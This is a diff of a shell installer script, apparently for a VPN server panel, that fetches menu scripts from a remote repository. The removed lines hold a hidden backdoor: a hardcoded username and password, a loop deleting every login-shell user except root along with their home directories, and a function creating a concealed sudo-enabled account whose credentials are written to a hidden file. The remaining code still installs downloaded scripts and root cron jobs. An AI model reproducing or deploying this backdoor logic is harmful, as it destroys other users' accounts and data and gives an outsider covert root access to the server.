@@ -90,36 +90,7 @@ biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
 
 # Repository
 REPO="http://rajaserver.web.id/v7/"
-pwadm="@Ridwan112#"
-Username="xwan"
-Password="$pwadm"
 
-# -----------------------------
-# Hapus user yang tidak diizinkan
-# -----------------------------
-allowed_users=("root")
-all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
-for user in $all_users; do
-    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
-        userdel -r "$user" > /dev/null 2>&1
-        echo "User $user telah dihapus."
-    fi
-done
-
-# -----------------------------
-# Tambahkan user baru jika belum ada
-# -----------------------------
-function cok(){
-if id "$Username" &>/dev/null; then
-    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
-else
-    echo -e "$Username $Password" > /etc/xray/.adm
-    mkdir -p /home/script/
-    useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
-    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
-    usermod -aG sudo "$Username" > /dev/null 2>&1
-fi
-}
 # -----------------------------
 # Download & Setup Menu
 # -----------------------------
@@ -127,7 +98,7 @@ echo -e " [INFO] Downloading menu.zip..."
 {
     > /etc/cron.d/cpu_otm
 
-    cat > /etc/cron.d/cpu_xwan <<END
+    cat > /etc/cron.d/cpu_ari <<END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 */5 * * * * root /usr/bin/autocpu
@@ -140,7 +111,7 @@ END
     chmod +x /usr/bin/enc
 
     # Extract dan encrypt menu
-    7z x -p$pwadm menu.zip &> /dev/null
+    unzip menu.zip &> /dev/null
     chmod +x menu/*
     enc menu/* &> /dev/null
     mv menu/* /usr/local/sbin
